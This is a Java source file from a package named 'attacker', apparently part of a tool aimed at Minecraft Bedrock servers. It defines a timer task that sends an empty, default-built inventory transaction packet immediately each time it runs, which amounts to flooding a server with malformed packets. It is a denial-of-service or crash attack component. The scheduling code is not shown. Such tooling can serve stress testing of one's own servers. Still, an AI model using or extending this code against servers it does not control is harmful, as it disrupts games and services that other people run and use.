package com.nukkitx.protocol.attacker.task;

import com.nukkitx.protocol.bedrock.BedrockClientSession;
import com.nukkitx.protocol.bedrock.packet.InventoryTransactionPacket;

import java.util.TimerTask;

public class InventoryTransactionPacketAttack extends TimerTask {

    private static final InventoryTransactionPacket PACKET = new InventoryTransactionPacket();

    private final BedrockClientSession session;

    public InventoryTransactionPacketAttack(BedrockClientSession session) {
        this.session = session;
    }

    @Override
    public void run() {
        this.session.sendPacketImmediately(PACKET);
    }
}
